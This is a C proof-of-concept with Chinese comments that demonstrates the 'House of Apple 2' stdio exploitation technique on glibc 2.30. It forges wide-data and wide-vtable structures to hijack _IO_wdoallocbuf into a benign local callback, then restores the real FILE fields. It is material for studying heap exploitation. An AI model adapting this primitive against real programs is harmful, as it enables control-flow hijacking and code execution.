#define _GNU_SOURCE
/*
 * House of Apple 2 最终触发点：glibc 2.30，x86-64 过渡 ABI。
 *
 * 2.30 删除 legacy codecvt 函数表后，`_IO_wide_data._wide_vtable` 从旧版
 * +0x130 缩到 +0xf0；2.31 又进一步缩为 +0xe0。因此 2.30 必须单独一份
 * payload。调用链仍是：合法 `_IO_wfile_jumps` -> `_IO_wfile_overflow` ->
 * `_IO_wdoallocbuf` -> 未校验 fake wide vtable 的 doallocate 槽。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

typedef wint_t (*woverflow_fn)(FILE *, wint_t);
static int callback_count;
static FILE *callback_file;

static int apple2_callback(FILE *fp)
{
    callback_count++;
    callback_file = fp;
    return WEOF;
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);
    FILE *fp = tmpfile();
    assert(fp != NULL);

    // 使用真实 `_IO_wfile_jumps` 通过主 vtable 白名单，并直接调用公开的 overflow 包装入口。
    void *wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    woverflow_fn call_woverflow =
        (woverflow_fn)dlsym(RTLD_DEFAULT, "__woverflow");
    assert(wfile_jumps != NULL && call_woverflow != NULL);

    /* 保存所有会被触发路径修改的真实 FILE 字段。伪对象位于栈上，若不恢复，
       fclose 或进程退出时再次消费它会造成与利用原语无关的崩溃。 */
    void **wide_data_slot = (void **)((char *)fp + 0xa0);
    void **primary_vtable_slot = (void **)((char *)fp + sizeof(FILE));
    void *saved_wide_data = *wide_data_slot;
    void *saved_primary_vtable = *primary_vtable_slot;
    int saved_flags = fp->_flags, saved_flags2 = fp->_flags2;
    int saved_mode = fp->_mode;
    char *saved_read_ptr = fp->_IO_read_ptr, *saved_read_end = fp->_IO_read_end;
    char *saved_read_base = fp->_IO_read_base;
    char *saved_write_base = fp->_IO_write_base;
    char *saved_write_ptr = fp->_IO_write_ptr, *saved_write_end = fp->_IO_write_end;
    char *saved_buf_base = fp->_IO_buf_base, *saved_buf_end = fp->_IO_buf_end;

    // glibc 2.30 的 `_wide_vtable` 位于 +0xf0，这是该版本必须单独写 payload 的原因。
    uint64_t fake_wide_data[0x110 / 8] __attribute__((aligned(0x10)));
    uint64_t fake_wide_vtable[0x80 / 8] __attribute__((aligned(0x10)));
    char narrow_buffer[0x20];
    memset(fake_wide_data, 0, sizeof(fake_wide_data));
    memset(fake_wide_vtable, 0, sizeof(fake_wide_vtable));
    memset(narrow_buffer, 0, sizeof(narrow_buffer));

    // `_IO_jump_t.__doallocate` 位于 vtable+0x68；这里把它替换为可断言的本地回调。
    fake_wide_data[0xf0 / 8] = (uintptr_t)fake_wide_vtable;
    fake_wide_vtable[0x68 / 8] = (uintptr_t)apple2_callback;
    *wide_data_slot = fake_wide_data;
    *primary_vtable_slot = wfile_jumps;
    /* 将 FILE 置为可写宽字符流，并清除 NO_WRITES、UNBUFFERED、
       CURRENTLY_PUTTING，使 `_IO_wfile_overflow` 必须进入 `_IO_wdoallocbuf`。 */
    fp->_mode = 1;
    fp->_flags &= ~(0x8 | 0x2 | 0x800);
    fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_read_end = narrow_buffer;
    fp->_IO_write_base = fp->_IO_write_ptr = narrow_buffer;
    fp->_IO_write_end = narrow_buffer + sizeof(narrow_buffer);
    fp->_IO_buf_base = narrow_buffer;
    fp->_IO_buf_end = narrow_buffer + sizeof(narrow_buffer);

    // 真正消费点：合法主 vtable 进入 `_IO_wdoallocbuf`，随后调用未校验的伪宽表。
    wint_t result = call_woverflow(fp, L'A');
    assert(callback_count == 1 && callback_file == fp && result == L'A');

    // 成功判据确认后恢复真实对象，保证清理过程不会再次访问栈上的伪结构。
    *wide_data_slot = saved_wide_data;
    *primary_vtable_slot = saved_primary_vtable;
    fp->_flags = saved_flags; fp->_flags2 = saved_flags2; fp->_mode = saved_mode;
    fp->_IO_read_ptr = saved_read_ptr; fp->_IO_read_end = saved_read_end;
    fp->_IO_read_base = saved_read_base; fp->_IO_write_base = saved_write_base;
    fp->_IO_write_ptr = saved_write_ptr; fp->_IO_write_end = saved_write_end;
    fp->_IO_buf_base = saved_buf_base; fp->_IO_buf_end = saved_buf_end;
    fclose(fp);
    puts("[+] Apple2：宽表 +0xf0 命中");
    return 0;
}
